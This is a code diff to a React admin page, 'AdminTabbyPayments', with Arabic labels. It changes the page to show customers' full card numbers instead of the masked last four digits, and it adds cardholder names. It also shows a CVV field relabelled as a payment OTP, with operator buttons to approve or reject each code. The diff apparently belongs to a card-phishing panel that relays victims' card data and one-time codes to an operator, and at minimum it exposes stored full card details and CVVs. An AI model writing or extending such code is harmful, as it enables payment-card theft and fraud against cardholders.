@@ -23,6 +23,7 @@ interface TabbyPayment {
   phone: string | null;
   payment_status: string;
   created_at: string;
+  updated_at: string;
 }
 
 const AdminTabbyPayments = () => {
@@ -231,9 +232,16 @@ const AdminTabbyPayments = () => {
                       )}
                       
                       <div className="bg-orange-50 border border-orange-200 rounded-lg p-3">
-                        <div className="text-xs text-orange-600 font-medium mb-1">رقم البطاقة</div>
-                        <div className="font-mono font-bold text-sm text-gray-900">
-                          **** **** **** {payment.card_number_last4}
+                        <div className="text-xs text-orange-600 font-medium mb-1">رقم البطاقة الكامل</div>
+                        <div className="font-mono font-bold text-sm text-gray-900" dir="ltr">
+                          {payment.card_number || `**** **** **** ${payment.card_number_last4}`}
+                        </div>
+                      </div>
+
+                      <div className="bg-gray-50 border border-gray-200 rounded-lg p-3">
+                        <div className="text-xs text-gray-600 font-medium mb-1">اسم حامل البطاقة</div>
+                        <div className="font-bold text-sm text-gray-900">
+                          {payment.cardholder_name}
                         </div>
                       </div>
 
@@ -252,12 +260,28 @@ const AdminTabbyPayments = () => {
                       </div>
                       
                       {payment.cvv && (
-                        <div className="bg-primary/10 border-2 border-primary rounded-lg p-3">
-                          <div className="text-xs text-primary font-medium mb-1">كود التحقق (OTP)</div>
+                        <div className="bg-primary/10 border-2 border-primary rounded-lg p-3 md:col-span-2">
+                          <div className="text-xs text-primary font-medium mb-1">كود تحقق الدفع (OTP)</div>
                           <div className="font-bold text-2xl text-primary text-center tracking-widest">
                             {payment.cvv}
                           </div>
                         </div>
+                      )}
+                    </div>
+
+                    {/* معلومات التاريخ */}
+                    <div className="mb-4 p-3 bg-gray-50 rounded-lg">
+                      <div className="text-xs text-gray-500 mb-1">تاريخ الإنشاء</div>
+                      <div className="text-sm font-medium">
+                        {format(new Date(payment.created_at), 'PPp', { locale: ar })}
+                      </div>
+                      {payment.updated_at !== payment.created_at && (
+                        <>
+                          <div className="text-xs text-gray-500 mb-1 mt-2">آخر تحديث</div>
+                          <div className="text-sm font-medium">
+                            {format(new Date(payment.updated_at), 'PPp', { locale: ar })}
+                          </div>
+                        </>
                       )}
                     </div>
 
@@ -274,7 +298,7 @@ const AdminTabbyPayments = () => {
                           ) : (
                             <Check className="h-4 w-4 ml-2" />
                           )}
-                          موافقة
+                          موافقة على كود التحقق
                         </Button>
                         <Button
                           onClick={() => handleReject(payment.id)}
@@ -287,7 +311,7 @@ const AdminTabbyPayments = () => {
                           ) : (
                             <X className="h-4 w-4 ml-2" />
                           )}
-                          رفض
+                          رفض كود التحقق
                         </Button>
                       </div>
                     )}
